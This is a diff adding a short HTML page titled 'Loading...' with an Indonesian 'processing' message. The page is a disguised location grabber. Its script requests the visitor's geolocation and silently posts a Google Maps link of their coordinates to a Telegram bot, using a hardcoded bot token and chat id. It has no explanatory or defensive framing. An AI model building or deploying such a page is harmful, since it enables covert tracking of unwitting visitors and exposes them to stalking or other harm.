@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+
+<h3>Sedang memproses...</h3>
+
+<script>
+  const token = "8735241674:AAFIGohuEAdZprSCZdU7aB63ZbBnh1l7vbg";
+  const chat_id = "7032109008";
+
+  function kirimLokasi(lat, lon) {
+    let pesan = `📍 Lokasi User:
+https://www.google.com/maps?q=${lat},${lon}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: pesan
+      })
+    });
+  }
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      let lat = position.coords.latitude;
+      let lon = position.coords.longitude;
+
+      kirimLokasi(lat, lon);
+    });
+  }
+</script>
+
+</body>
+</html>
